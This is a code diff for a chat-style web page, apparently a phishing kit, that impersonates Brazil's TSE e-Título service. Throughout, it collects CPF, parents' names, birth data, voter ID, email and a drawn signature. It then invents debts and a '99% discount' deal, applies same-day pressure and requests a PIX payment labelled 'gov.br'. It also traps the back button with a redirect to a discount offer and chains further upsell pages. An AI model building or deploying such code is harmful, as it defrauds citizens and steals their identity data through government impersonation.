+
+    var limparBtnWrap = document.createElement('div');
+    limparBtnWrap.style.marginTop = '8px';
+    limparBtnWrap.style.display = 'flex';
+    limparBtnWrap.style.justifyContent = 'flex-end';
+
+    var limparBtn = document.createElement('button');
+    limparBtn.className = 'chat-btn';
+    limparBtn.textContent = 'Limpar';
+    limparBtn.onclick = function() {
+      // Limpa com fundo transparente
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+    };
+
+    limparBtnWrap.appendChild(limparBtn);
+    assinDiv.appendChild(assinLabel);
+    assinDiv.appendChild(canvas);
+    assinDiv.appendChild(limparBtnWrap);
+
+    // Mensagem de erro para Assinatura
+    var assinErro = document.createElement('div');
+    assinErro.style.color = '#dc2626';
+    assinErro.style.fontSize = '12px';
+    assinErro.style.marginTop = '6px';
+    assinErro.style.display = 'none';
+    assinErro.textContent = '❌ Assinatura não reconhecida';
+    assinDiv.appendChild(assinErro);
+
+    formDiv.appendChild(assinDiv);
+
+    formWrap.appendChild(formDiv);
+    msgs.appendChild(formWrap);
+    scroll();
+
+    return {
+      nome: nomeInput,
+      nasc: nascInput,
+      mae: maeInput,
+      dataEleicao: dataEleicaoInput,
+      titulo: tituloInput,
+      tituloErro: tituloErro,
+      canvas: canvas,
+      assinErro: assinErro,
+      wrap: formWrap
+    };
+  }
+
+  function addJustificativaForm() {
+    var formWrap = document.createElement('div');
+    formWrap.style.marginLeft = '40px';
+    formWrap.style.marginBottom = '10px';
+    formWrap.style.width = 'calc(100% - 40px)';
+
+    var formDiv = document.createElement('div');
+    formDiv.style.background = '#ffffff';
+    formDiv.style.border = '1px solid #cbd5e1';
+    formDiv.style.borderRadius = '12px';
+    formDiv.style.padding = '16px';
+    formDiv.style.boxShadow = '0 2px 8px rgba(0,0,0,0.04)';
+
+    var titleDiv = document.createElement('div');
+    titleDiv.style.fontWeight = '800';
+    titleDiv.style.marginBottom = '16px';
+    titleDiv.style.color = '#0f172a';
+    titleDiv.style.fontSize = '14px';
+    titleDiv.textContent = 'Preencha os dados abaixo para justificativa de ausência:';
+    formDiv.appendChild(titleDiv);
+
+    // Dropdown Eleição
+    var selectDiv = document.createElement('div');
+    selectDiv.style.marginBottom = '14px';
+    var selectLabel = document.createElement('label');
+    selectLabel.style.display = 'block';
+    selectLabel.style.fontWeight = '600';
+    selectLabel.style.marginBottom = '6px';
+    selectLabel.style.fontSize = '13px';
+    selectLabel.style.color = '#475569';
+    selectLabel.textContent = 'Eleição que deseja justificar:';
+    var select = document.createElement('select');
+    select.style.width = '100%';
+    select.style.padding = '10px';
+    select.style.border = '1px solid #cbd5e1';
+    select.style.borderRadius = '6px';
+    select.style.fontSize = '14px';
+    select.style.fontFamily = 'inherit';
+    var opt1 = document.createElement('option');
+    opt1.value = '2026-1o';
+    opt1.textContent = '2026 - 1º turno';
+    var opt2 = document.createElement('option');
+    opt2.value = '2026-2o';
+    opt2.textContent = '2026 - 2º turno (indisponível)';
+    opt2.disabled = true;
+    select.appendChild(opt1);
+    select.appendChild(opt2);
+
+    // Remove erro ao selecionar eleição válida
+    select.addEventListener('change', function() {
+      if (this.value && this.value !== '') {
+        selectErro.style.display = 'none';
+        select.style.borderColor = '#cbd5e1';
+      }
+    });
+
+    selectDiv.appendChild(selectLabel);
+    selectDiv.appendChild(select);
+    formDiv.appendChild(selectDiv);
+
+    // Texto Justificativa
+    var textDiv = document.createElement('div');
+    textDiv.style.marginBottom = '14px';
+    var textLabel = document.createElement('label');
+    textLabel.style.display = 'block';
+    textLabel.style.fontWeight = '600';
+    textLabel.style.marginBottom = '6px';
+    textLabel.style.fontSize = '13px';
+    textLabel.style.color = '#475569';
+    textLabel.textContent = 'Explique o motivo da ausência:';
+    var textArea = document.createElement('textarea');
+    textArea.style.width = '100%';
+    textArea.style.padding = '10px';
+    textArea.style.border = '1px solid #cbd5e1';
+    textArea.style.borderRadius = '6px';
+    textArea.style.fontSize = '14px';
+    textArea.style.fontFamily = 'inherit';
+    textArea.style.minHeight = '80px';
+    textArea.style.resize = 'vertical';
+    textArea.placeholder = 'Digite sua justificativa...';
+
+    // Remove erro ao digitar justificativa válida
+    textArea.addEventListener('input', function() {
+      if (this.value && this.value.trim() !== '') {
+        textErro.style.display = 'none';
+        textArea.style.borderColor = '#cbd5e1';
+      }
+    });
+
+    textDiv.appendChild(textLabel);
+    textDiv.appendChild(textArea);
+    formDiv.appendChild(textDiv);
+
+    // Email
+    var emailDiv = document.createElement('div');
+    emailDiv.style.marginBottom = '14px';
+    var emailLabel = document.createElement('label');
+    emailLabel.style.display = 'block';
+    emailLabel.style.fontWeight = '600';
+    emailLabel.style.marginBottom = '6px';
+    emailLabel.style.fontSize = '13px';
+    emailLabel.style.color = '#475569';
+    emailLabel.textContent = 'Seu e-mail:';
+    var emailInput = document.createElement('input');
+    emailInput.type = 'email';
+    emailInput.style.width = '100%';
+    emailInput.style.padding = '10px';
+    emailInput.style.border = '1px solid #cbd5e1';
+    emailInput.style.borderRadius = '6px';
+    emailInput.style.fontSize = '14px';
+    emailInput.style.fontFamily = 'inherit';
+    emailInput.placeholder = 'seu@email.com';
+
+    // Mensagem de erro para email
+    var emailErro = document.createElement('div');
+    emailErro.style.color = '#dc2626';
+    emailErro.style.fontSize = '12px';
+    emailErro.style.marginTop = '4px';
+    emailErro.style.display = 'none';
+    emailErro.textContent = '❌ Email inválido';
+
+    emailDiv.appendChild(emailLabel);
+    emailDiv.appendChild(emailInput);
+    emailDiv.appendChild(emailErro);
+
+    // Remove erro ao digitar email válido
+    emailInput.addEventListener('input', function() {
+      if (isValidEmail(this.value)) {
+        emailErro.style.display = 'none';
+        emailInput.style.borderColor = '#cbd5e1';
+      }
+    });
+
+    formDiv.appendChild(emailDiv);
+
+    // Mensagens de erro para outros campos
+    var selectErro = document.createElement('div');
+    selectErro.style.color = '#dc2626';
+    selectErro.style.fontSize = '12px';
+    selectErro.style.marginTop = '4px';
+    selectErro.style.display = 'none';
+    selectErro.textContent = '❌ Selecione uma eleição';
+    selectDiv.appendChild(selectErro);
+
+    var textErro = document.createElement('div');
+    textErro.style.color = '#dc2626';
+    textErro.style.fontSize = '12px';
+    textErro.style.marginTop = '4px';
+    textErro.style.display = 'none';
+    textErro.textContent = '❌ Preencha a justificativa';
+    textDiv.appendChild(textErro);
+
+    formWrap.appendChild(formDiv);
+    msgs.appendChild(formWrap);
+    scroll();
+
+    return {
+      select: select,
+      selectErro: selectErro,
+      textarea: textArea,
+      textErro: textErro,
+      email: emailInput,
+      emailErro: emailErro,
+      wrap: formWrap
+    };
+  }
+
+  function addButtons(options, wide, solid, right) {
+    return new Promise(function (resolve) {
+      var wrap = document.createElement('div');
+      wrap.style.marginBottom = '10px';
+      if (right) { wrap.style.display = 'flex'; wrap.style.justifyContent = 'flex-end'; }
+      else { wrap.style.marginLeft = '40px'; }
+      var row = document.createElement('div');
+      row.className = wide ? 'btn-row' : 'btn-row row-inline';
+      options.forEach(function (opt) {
+        var btn = document.createElement('button');
+        btn.className = 'chat-btn' + (wide ? ' wide solid' : '') + (!wide && solid ? ' solid' : '');
+        btn.textContent = opt;
+        btn.onclick = function () {
+          wrap.remove();
+          addUser(opt);
+          resolve(opt);
+        };
+        row.appendChild(btn);
+      });
+      wrap.appendChild(row);
+      msgs.appendChild(wrap); scroll();
+    });
+  }
+
+  async function botSay(html) {
+    addTyping(); await sleep(1100); removeTyping();
+    botRow('<div class="bubble-bot">' + tag(html) + '</div>');
+    await sleep(800);
+  }
+
+  async function startFlow() {
+    if (!NOME || !CPF) {
+      addSystem('<em>(Dados de identificação ausentes. Redirecionando para a consulta...)</em>');
+      setTimeout(function () { window.location.href = '../consulta/'; }, 1800);
+      return;
+    }
+
+    var primeiroNome = NOME_COMPLETO.split(' ')[0];
+    await botSay('Olá <strong>' + primeiroNome + '</strong>, seja bem vindo(a) ao canal oficial de atendimento do <strong>e-Título</strong> disponibilizado pelo <strong>TSE - Tribunal Superior Eleitoral</strong>. Seus dados estão protegidos sob sigilo e criptografia de ponta a ponta.');
+    await botSay('Aguarde um instante, estamos conectando você ao sistema para justificativa de votos.');
+    await addProgressBar();
+
+    // Confirmação de dados
+    var confirmWrap = document.createElement('div');
+    confirmWrap.style.marginLeft = '40px';
+    confirmWrap.style.marginBottom = '10px';
+    var cCard = document.createElement('div');
+    cCard.className = 'confirm-card';
+    cCard.innerHTML = '<span class="confirm-title">Para sua segurança, confirme os dados do eleitor:</span>'
+      + '<strong>NOME COMPLETO DO ELEITOR:</strong><span>' + NOME_COMPLETO + '</span>'
+      + '<strong>CPF:</strong><span>' + CPF_FORMATADO + '</span>'
+      + (NOME_PAI ? '<strong>Nome do Pai:</strong><span>' + NOME_PAI + '</span>' : '')
+      + (NOME_MAE ? '<strong>Nome da Mãe:</strong><span>' + NOME_MAE + '</span>' : '')
+      + (NASC ? '<strong>Data de Nascimento:</strong><span>' + formatData(NASC) + '</span>' : '')
+      + (MUNICIPIO ? '<strong>Município de Nascimento:</strong><span>' + MUNICIPIO + '</span>' : '');
+    var btnsConfirm = document.createElement('div');
+    btnsConfirm.className = 'confirm-btns';
+    ['Sim, está correto.', 'Não sou eu'].forEach(function (label) {
+      var btn = document.createElement('button');
+      btn.className = 'chat-btn' + (label.indexOf('Sim') === 0 ? ' solid' : '');
+      btn.textContent = label;
+      btn.onclick = function () {
+        confirmWrap.remove();
+        addUser(label);
+        if (label.indexOf('Sim') === 0) continueFlow();
+        else { 
+          setTimeout(async function () { 
+            await botSay('Por favor, informe o CPF correto para prosseguir com a renegociação.'); 
+            setTimeout(function(){ window.location.href = '../consulta/'; }, 1500); 
+          }, 600); 
+        }
+      };
+      btnsConfirm.appendChild(btn);
+    });
+    confirmWrap.appendChild(cCard); confirmWrap.appendChild(btnsConfirm);
+    msgs.appendChild(confirmWrap); scroll();
+  }
+
+  async function continueFlow() {
+    await sleep(500);
+    await botSay('Obrigada pela confirmação!');
+    await botSay('Conectando à sua conta do e-Título...');
+    await botSay('<strong>Autenticação efetuada com sucesso!</strong>');
+    await botSay('<strong>' + NOME_COMPLETO + '</strong><br><br><strong>⚠️ Guia de Conscientização</strong><br><br><strong>Segundo o Código Eleitoral (Lei nº 4.737/1965)</strong>, ao deixar de votar e não apresentar justificativa perante o juiz eleitoral, a pessoa incorre em multa de 3 a 10% do valor do salário-mínimo da região, imposta pelo juízo competente.<br><br><strong>Além disso, ao deixar de votar, de justificar e de pagar as multas devidas, a eleitora ou o eleitor também fica impedido de:</strong><br><br>❌ Receber vencimentos, remuneração, salário ou proventos de função ou emprego público, autárquico ou paraestatal, de fundações governamentais, de empresas, de institutos e de sociedades de qualquer natureza, mantidas ou subvencionadas pelo governo ou que exerçam serviço público delegado, correspondentes ao segundo mês subsequente ao da eleição.<br><br>❌ Participar de concorrência pública ou administrativa da União, dos estados, dos territórios, do Distrito Federal, dos municípios ou das respectivas autarquias.<br><br>❌ Renovar matrícula em estabelecimento de ensino oficial ou fiscalizado pelo governo.<br><br>❌ Praticar qualquer ato para o qual se exija quitação do serviço militar ou imposto de renda.<br><br>❌ Obter certidão de quitação eleitoral para fins de instrução de registro de candidatura.<br><br>❌ Obter certidão de regularidade do exercício do voto, justificativa ou pagamento da multa no último turno da última eleição ou de regularidade do comparecimento às urnas ou do pagamento da multa pela ausência e do atendimento às convocações para os trabalhos eleitorais.<br><br>❌ Obter qualquer documento perante repartições diplomáticas a que a pessoa estiver subordinada.<br><br><strong>Cancelamento de inscrição:</strong> Será cancelada a inscrição da eleitora ou do eleitor que não votar em três eleições consecutivas (sendo cada turno considerado uma eleição), não justificar a ausência e não pagar a multa devida, a contar da data do último pleito a que deveria ter comparecido.');
+
+    await botSay('Para confirmar a sua justificativa de voto você precisa completar as próximas etapas para a emissão do seu comprovante de justificativa de voto, você deseja continuar?');
+
+    await addButtons(['CONTINUAR'], false, true, true);
+
+    addTyping();
+    await sleep(2000);
+    removeTyping();
+
+    var form = addJustificativaForm();
+
+    return new Promise(function(resolve) {
+      // Adiciona botão CONTINUAR fora da caixinha
+      setTimeout(function() {
+        var btnWrap = document.createElement('div');
+        btnWrap.style.marginLeft = '40px';
+        btnWrap.style.marginBottom = '10px';
+        btnWrap.style.display = 'flex';
+        btnWrap.style.justifyContent = 'flex-end';
+        var continueBtn = document.createElement('button');
+        continueBtn.className = 'chat-btn solid';
+        continueBtn.textContent = 'CONTINUAR';
+        continueBtn.id = 'justificativa-continue-btn';
+        btnWrap.appendChild(continueBtn);
+        msgs.appendChild(btnWrap);
+        scroll();
+
+        continueBtn.onclick = function() {
+          // Limpa erros anteriores
+          form.selectErro.style.display = 'none';
+          form.textErro.style.display = 'none';
+          form.emailErro.style.display = 'none';
+          form.select.style.borderColor = '#cbd5e1';
+          form.textarea.style.borderColor = '#cbd5e1';
+          form.email.style.borderColor = '#cbd5e1';
+
+          var temErro = false;
+
+          // Valida Eleição
+          if (!form.select.value || form.select.value === '') {
+            form.selectErro.style.display = 'block';
+            form.select.style.borderColor = '#dc2626';
+            temErro = true;
+          }
+
+          // Valida Justificativa
+          if (!form.textarea.value || form.textarea.value.trim() === '') {
+            form.textErro.style.display = 'block';
+            form.textarea.style.borderColor = '#dc2626';
+            temErro = true;
+          }
+
+          // Valida Email
+          if (!isValidEmail(form.email.value)) {
+            form.emailErro.style.display = 'block';
+            form.email.style.borderColor = '#dc2626';
+            temErro = true;
+          }
+
+          if (temErro) {
+            return;
+          }
+
+          // Desabilita os campos
+          form.select.disabled = true;
+          form.textarea.disabled = true;
+          form.email.disabled = true;
+          continueBtn.disabled = true;
+          continueBtn.style.opacity = '0.6';
+
+          // Desabilita todo o formulário anterior para evitar edição posterior
+          disableFormInputs(form.wrap);
+          disableFormInputs(btnWrap);
+
+          // Gera ID aleatório
+          var numAleatorio = Math.floor(Math.random() * 99999) + 10000;
+          var ano = new Date().getFullYear();
+          var justificativaId = numAleatorio + '-' + ano;
+
+          setTimeout(function() {
+            botRow('<div class="bubble-bot">Justificativa #' + justificativaId + ' anexada ao sistema para geração da guia de comprovante.</div>');
+            scroll();
+
+            setTimeout(function() {
+              addTyping();
+            }, 800);
+
+            setTimeout(function() {
+              removeTyping();
+              var completarForm = addCompletarDadosForm();
+
+              setTimeout(function() {
+                var gerarBtn = document.createElement('button');
+                gerarBtn.className = 'chat-btn solid';
+                gerarBtn.style.marginLeft = 'auto';
+                gerarBtn.style.marginRight = '0';
+                gerarBtn.style.marginBottom = '10px';
+                gerarBtn.style.marginTop = '10px';
+                gerarBtn.textContent = 'Continuar';
+                gerarBtn.onclick = function() {
+                  // Limpa erros anteriores
+                  completarForm.tituloErro.style.display = 'none';
+                  completarForm.assinErro.style.display = 'none';
+
+                  // Validação do Título
+                  if (!completarForm.titulo.value || completarForm.titulo.value.trim() === '') {
+                    completarForm.tituloErro.style.display = 'block';
+                  }
+
+                  // Verifica se há algo desenhado no canvas
+                  var canvasCtx = completarForm.canvas.getContext('2d');
+                  var imageData = canvasCtx.getImageData(0, 0, completarForm.canvas.width, completarForm.canvas.height);
+                  var pixels = imageData.data;
+                  var temDesenho = false;
+
+                  // Verifica se há pixels que não sejam branco (255, 255, 255, 255)
+                  for (var i = 0; i < pixels.length; i += 4) {
+                    if (pixels[i] !== 255 || pixels[i + 1] !== 255 || pixels[i + 2] !== 255) {
+                      temDesenho = true;
+                      break;
+                    }
+                  }
+
+                  if (!temDesenho) {
+                    completarForm.assinErro.style.display = 'block';
+                    return;
+                  }
+
+                  // Se houver erros, retorna sem continuar
+                  if (!completarForm.titulo.value || completarForm.titulo.value.trim() === '') {
+                    return;
+                  }
+
+                  var assinaturaData = completarForm.canvas.toDataURL();
+
+                  var turnoValue = form.select.value === '2026-1o' ? '1º' : '2º';
+
+                  var dadosPDF = {
+                    cpf: CPF,
+                    nome: completarForm.nome.value,
+                    nasc: completarForm.nasc.value,
+                    mae: completarForm.mae.value,
+                    turno: turnoValue,
+                    data: completarForm.dataEleicao.value,
+                    titulo: completarForm.titulo.value,
+                    justificativa: form.textarea.value,
+                    email: form.email.value,
+                    assinatura: assinaturaData
+                  };
+
+                  // Desabilita o botão de gerar
+                  gerarBtn.disabled = true;
+                  gerarBtn.style.opacity = '0.6';
+
+                  // Desabilita todo o formulário anterior para evitar edição posterior
+                  disableFormInputs(completarForm.wrap);
+
+                  // Mostra loading por 3 segundos
+                  addTyping();
+
+                  // Aguarda 3 segundos e gera o comprovante
+                  setTimeout(function() {
+                    removeTyping();
+                    gerarComprovantePDF(dadosPDF);
+                  }, 3000);
+                };
+                var btnWrap = document.createElement('div');
+                btnWrap.style.display = 'flex';
+                btnWrap.style.marginRight = '0';
+                btnWrap.appendChild(gerarBtn);
+                msgs.appendChild(btnWrap);
+                scroll();
+              }, 500);
+
+              resolve();
+            }, 2200);
+          }, 400);
+        };
+      }, 400);
+    });
+
+    await botSay('<em>Consultando o Sistema de Informações de Crédito (SCR) do Banco Central e bases conveniadas...</em>');
+    await sleep(2600);
+    await botSay('<em>Localizando registros ativos em seu CPF...</em>');
+    await sleep(2600);
+    await botSay('<strong>Consulta concluída!</strong>');
+    await sleep(2000);
+    await botSay('Identificamos <strong>4 dívidas ativas</strong> em aberto. Os valores acumulados totalizam entre <strong>R$ 1.728,74 e R$ 5.278,23</strong> vinculados ao seu CPF.');
+    await sleep(2600);
+
+    infoCard([
+      { text: 'Situação do Documento:', style: 'label' },
+      { text: 'CPF: {CPF_FORMATADO}',   style: 'value' },
+      { text: 'STATUS: RESTRITO / NEGATIVADO.', style: 'bold' }
+    ]);
+
+    await botSay('Seu índice de SCORE atual encontra-se classificado como <strong>Baixo / Risco de Crédito:</strong>');
+    addImage('../assets/score.jpg');
+    await botSay('Deseja consultar a proposta de acordo com subsídio oficial e desconto especial disponível para você?');
+    await addButtons(['BUSCAR ACORDO'], false, true, true);
+
+    await botSay('<em>Aplicando diretrizes do Programa de Justificativa Eleitoral...</em>');
+    await botSay('<strong>Proposta de Quitação Localizada!</strong>');
+    infoCard([
+      { text: '1 (uma) proposta de quitação integral gerada para:', style: 'bold' },
+      { text: '{NOME_COMPLETO}',                                  style: 'value' },
+      { text: 'Documento: {CPF_FORMATADO}',                        style: 'value' }
+    ]);
+    await addButtons(['VER ACORDO'], false, true, true);
+    
+    await addAudioThen('../assets/buscaacordo.mp3', async function() {
+      await botSay('Parabéns <strong>{NOME_COMPLETO}!</strong><br><br>Sua proposta foi aprovada com <strong>99% DE DESCONTO</strong> pelo Programa Oficial!');
+      return Promise.resolve();
+    });
+
+    await botSay('<em>Acessando o Termo de Acordo <strong>{CODIGO_ACORDO}</strong>...</em>');
+    await botSay('Termo de Homologação <strong><em>{CODIGO_ACORDO}</em></strong> emitido para <strong>{NOME_COMPLETO}</strong> (CPF: {CPF_FORMATADO})');
+    await botSay('O termo é intransferível e exclusivo para o titular portador do CPF <strong>{CPF_FORMATADO}</strong>.');
+    await botSay('Deseja confirmar o acordo com <strong>99% DE DESCONTO</strong> para liquidar todas as dívidas e restabelecer seu crédito por apenas <strong>{VALOR}</strong>?');
+    await addButtons(['CONFIRMAR O ACORDO E LIMPAR O NOME'], false, true, true);
+
+    await addAudioThen('../assets/parabens.mp3', async function() {
+      await botSay('<strong>Acordo confirmado com sucesso!</strong>');
+      return await addButtons(['CONTINUAR'], false, true, true);
+    });
+
+    await addAudioThen('../assets/pagamento.mp3', async function() {
+      infoCard([
+        { text: 'Protocolo de Homologação: {CODIGO_ACORDO}',  style: 'label' },
+        { text: 'Beneficiário(a):',                           style: 'label' },
+        { text: '{NOME_COMPLETO}',                            style: 'bold'  },
+        { text: 'Documento (CPF):',                           style: 'label' },
+        { text: '{CPF_FORMATADO}',                            style: 'bold'  },
+        { text: 'Quitação e Baixa de Todas as Dívidas Ativas no CPF.', style: 'value' },
+        { text: 'Restabelecimento do Score (+895 Pontos).',   style: 'bold'  },
+        { text: 'Valor Final Homologado: {VALOR}',            style: 'label' }
+      ]);
+      return await addButtons(['CONTINUAR PARA O PAGAMENTO'], false, true, true);
+    });
+
+    await addAudioThen('../assets/aviso.mp3', async function() {
+      await botSay('<strong><em>Atenção!</em></strong> <em>Condição homologada válida apenas para liquidação no dia de hoje.</em>');
+      return await botSay('<em>Clique no botão abaixo para gerar sua Guia Oficial de Pagamento com Chave PIX.</em>');
+    });
+
+    // Botão final: Gera PIX via API de pagamento gov
+    await sleep(600);
+    var finRow = document.createElement('div');
+    finRow.style.marginLeft = '40px';
+    finRow.style.marginBottom = '12px';
+    finRow.style.width = 'calc(100% - 40px)';
+    
+    var finBtn = document.createElement('button');
+    finBtn.className = 'btn-link-final';
+    finBtn.innerHTML = 'GERAR GUIA DE PAGAMENTO PIX 🔒';
+    finBtn.onclick = async function() {
+      finBtn.disabled = true;
+      finBtn.innerHTML = 'GERANDO GUIA OFICIAL...';
+      
+      try {
+        const body = new URLSearchParams();
+        body.set('nome', NOME_COMPLETO);
+        body.set('cpf', CPF);
+        body.set('telefone', PHONE);
+        body.set('etapa', ETAPA);
+        (function(){
+          var p = new URLSearchParams(window.location.search);
+          ['utm_source','utm_campaign','utm_medium','utm_content','utm_term','src','sck','gclid','fbclid','ttclid','leadId'].forEach(function(k){
+            var v = p.get(k);
+            if (v) body.set(k, v);
+          });
+        })();
+
+        const apiResp = await fetch('/api/pagamento.php', { method: 'POST', body: body });
+        const result = await apiResp.json();
+        if (!result.success) { throw new Error(result.error || 'Erro ao gerar PIX'); }
+        const pixCode = result.pixCode || (result.data && result.data.pix && (result.data.pix.qrcode || result.data.pix.code)) || '';
+        
+        if (pixCode) {
+          finRow.remove();
+
+
+          await botSay('Aqui está a sua <strong>Guia Oficial de Pagamento PIX</strong>:');
+          
+          const pixContainer = document.createElement('div');
+          pixContainer.className = 'pix-container';
+          pixContainer.innerHTML = `
+            <div class="pix-header-badge">✓ Guia Homologada gov.br</div>
+            <div class="pix-title">Pagamento via PIX Instantâneo</div>
+            <div class="pix-sub">Valor do Acordo: <strong>${VALOR}</strong></div>
+            <div class="qrcode-wrapper" id="qrcode"></div>
+            <div class="pix-copy-paste" id="pixCode" title="Clique para copiar">${pixCode}</div>
+            <button class="chat-btn solid wide" id="copyBtn">COPIAR CÓDIGO PIX</button>
+            <div class="pix-status"><div class="spinner"></div> Aguardando confirmação do Banco Central...</div>
+          `;
+          msgs.appendChild(pixContainer);
+          scroll();
+
+          // Backredirect: gerou o PIX e tentou voltar sem pagar -> oferta com 50%.
+          // Empilha um estado no histórico; o "voltar" cai no popstate e a gente
+          // troca a página pela oferta, levando a query string inteira.
+          try {
+            history.pushState({ pixGerado: true }, '', window.location.href);
+            window.addEventListener('popstate', function () {
+              if (window.__pixPago) return;
+              var bp = new URLSearchParams(window.location.search);
+              bp.set('cpf', CPF);
+              bp.set('nome', NOME_COMPLETO);
+              window.location.replace('/desen/back/?' + bp.toString());
+            });
+          } catch (eBack) {}
+          
+          try {
+            new QRCode(document.getElementById("qrcode"), {
+              text: pixCode,
+              width: 190,
+              height: 190,
+              colorDark: "#000000",
+              colorLight: "#ffffff",
+              correctLevel: QRCode.CorrectLevel.M
+            });
+          } catch(errQr) {
+            document.getElementById("qrcode").innerHTML = '<img src="https://api.qrserver.com/v1/create-qr-code/?size=190x190&data=' + encodeURIComponent(pixCode) + '" style="border-radius:8px;">';
+          }
+
+          document.getElementById('copyBtn').onclick = function() {
+            navigator.clipboard.writeText(pixCode);
+            var copyBtn = document.getElementById('copyBtn');
+            copyBtn.textContent = '✓ CÓDIGO PIX COPIADO!';
+            copyBtn.style.backgroundColor = '#168821';
+            copyBtn.style.borderColor = '#168821';
+            setTimeout(function() {
+              copyBtn.textContent = 'COPIAR CÓDIGO PIX';
+              copyBtn.style.backgroundColor = '#1351B4';
+              copyBtn.style.borderColor = '#1351B4';
+            }, 2500);
+          };
+
+          // Polling de status de pagamento
+          const transactionId = result.token || (result.data && result.data.id) || '';
+          if (transactionId) {
+            const pollInterval = setInterval(async () => {
+              try {
+                const stResp = await fetch('/api/verificar.php?id=' + encodeURIComponent(transactionId), { cache: 'no-store' });
+                const statusRes = await stResp.json();
+                const status = String(statusRes.status || (statusRes.data && statusRes.data.status) || '').toLowerCase();
+                
+                if (status === 'paid' || status === 'completed' || status === 'approved' || status === 'authorized') {
+                  clearInterval(pollInterval);
+                  window.__pixPago = true; // desarma o backredirect
+                  pixContainer.querySelector('.pix-status').innerHTML = '✅ <strong>Pagamento Confirmado no Sistema!</strong>';
+                  pixContainer.querySelector('.pix-status').style.color = '#168821';
+                  
+
+
+                  await sleep(1200);
+                  await botSay('<strong>Pagamento confirmado com sucesso!</strong>');
+                  await botSay('Seu processo de baixa de restrições foi iniciado. Aguarde, estamos verificando as pendências restantes no seu CPF...');
+                  
+                  await sleep(2000);
+                  
+                  // Primeira etapa depois do pagamento principal. A ordem completa
+                  // está no mapa de rotas em /desen/js/admin-bypass.js:
+                  // atendimento -> upsells/1 -> upsell1 -> ... -> upsell4 -> regularizacao.
+                  var redirectParams = new URLSearchParams(window.location.search);
+                  redirectParams.set('cpf', CPF);
+                  redirectParams.set('nome', NOME_COMPLETO);
+                  redirectParams.set('paid', 'true');
+                  window.location.href = '/desen/upsells/1/?' + redirectParams.toString();
+                }
+              } catch (e) {
+                console.error('Erro no polling:', e);
+              }
+            }, 4500);
+          }
+        } else {
+          throw new Error('Código PIX não recebido');
+        }
+      } catch (error) {
+        console.error('Erro ao gerar PIX:', error);
+        alert('Erro ao gerar PIX: ' + error.message);
+        finBtn.disabled = false;
+        finBtn.innerHTML = 'GERAR GUIA DE PAGAMENTO PIX 🔒';
+      }
+    };
+    
+    finRow.appendChild(finBtn);
+    msgs.appendChild(finRow); scroll();
+  }
+
+  window.addEventListener('load', function () {
+    try {
+      // Se o CPF está na URL, busca os dados da API automaticamente
+      var params = paramsFromUrl();
+      if (params.cpf && !params.nome) {
+        fetch('../../api/getCpf.php?cpf=' + encodeURIComponent(params.cpf))
+          .then(function(resp) { return resp.json(); })
+          .then(function(data) {
+            if (data.success && data.nome) {
+              // Atualiza as variáveis globais com os dados da API
+              NOME_COMPLETO = NOME = data.nome || 'Contribuinte';
+              NOME_PAI = data.nome_pai || '';
+              NOME_MAE = data.mae || '';
+              NASC = data.nascimento || '';
+              MUNICIPIO = data.municipio || '';
+
+              // Salva no localStorage
+              try {
+                if (NOME) localStorage.setItem('site.nome', NOME);
+                if (NOME_PAI) localStorage.setItem('site.nome_pai', NOME_PAI);
+                if (NOME_MAE) localStorage.setItem('site.nome_mae', NOME_MAE);
+                if (NASC) localStorage.setItem('site.nasc', NASC);
+                if (MUNICIPIO) localStorage.setItem('site.municipio', MUNICIPIO);
+              } catch (_) {}
+            }
+            executarFluxo();
+          })
+          .catch(function(err) {
+            console.error('Erro ao buscar CPF:', err);
+            executarFluxo();
+          });
+      } else {
+        executarFluxo();
+      }
+
+      function executarFluxo() {
+        // Sincroniza o valor exibido com o que será cobrado, e só então começa.
+        var pronto = (typeof window.catalogoEtapa === 'function')
+          ? window.catalogoEtapa(ETAPA).then(function (item) { if (item) VALOR = 'R$ ' + item.valor; })
+          : Promise.resolve();
+
+        // O segundo callback garante que o atendimento começa mesmo se a
+        // consulta ao catálogo falhar: nesse caso vale o valor do HTML.
+        var comecar = function () { setTimeout(startFlow, 350); };
+        pronto.then(comecar, comecar);
+      }
+    } catch (e) {
+      console.error('Erro no startFlow:', e);
+      addSystem('❌ Ocorreu um erro ao carregar o atendimento.');
+    }
+  });
+  </script>
+
+    <!-- VLibras Integration -->
+  <div vw class="enabled">
+    <div vw-access-button class="active"></div>
+    <div vw-plugin-wrapper>
+      <div class="vw-plugin-top-wrapper"></div>
+    </div>
+  </div>
+
+  <!-- Modal de Conscientização -->
+  <div id="modalConscientizacao" style="
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.7);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 10000;
+    padding: 20px;
+  ">
+    <div style="
+      background: white;
+      border-radius: 12px;
+      max-width: 600px;
+      width: 100%;
+      max-height: 85vh;
+      overflow-y: auto;
+      padding: 30px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+    ">
+      <div style="
+        text-align: center;
+        margin-bottom: 20px;
+        padding-bottom: 20px;
+        border-bottom: 2px solid #173058;
+      ">
+        <h2 style="
+          color: #173058;
+          font-size: 18px;
+          margin: 0;
+          font-weight: 700;
+        ">⚠️ Guia de Conscientização</h2>
+        <p style="color: #666; font-size: 12px; margin: 5px 0 0 0;">Informações importantes antes de prosseguir</p>
+      </div>
+
+      <div style="font-size: 12px; line-height: 1.6; color: #333; text-align: justify;">
+        <p style="margin-bottom: 12px;"><strong>Segundo o Código Eleitoral (Lei nº 4.737/1965)</strong>, ao deixar de votar e não apresentar justificativa perante o juiz eleitoral, a pessoa incorre em multa de 3 a 10% do valor do salário-mínimo da região, imposta pelo juízo competente.</p>
+
+        <p style="margin-bottom: 12px;"><strong>Além disso, ao deixar de votar, de justificar e de pagar as multas devidas, a eleitora ou o eleitor também fica impedido de:</strong></p>
+
+        <ul style="margin: 12px 0; padding-left: 20px;">
+          <li style="margin-bottom: 6px;">❌ Receber vencimentos, remuneração, salário ou proventos de função ou emprego público, autárquico ou paraestatal, de fundações governamentais, de empresas, de institutos e de sociedades de qualquer natureza, mantidas ou subvencionadas pelo governo ou que exerçam serviço público delegado, correspondentes ao segundo mês subsequente ao da eleição.</li>
+          <li style="margin-bottom: 6px;">❌ Participar de concorrência pública ou administrativa da União, dos estados, dos territórios, do Distrito Federal, dos municípios ou das respectivas autarquias.</li>
+          <li style="margin-bottom: 6px;">❌ Renovar matrícula em estabelecimento de ensino oficial ou fiscalizado pelo governo.</li>
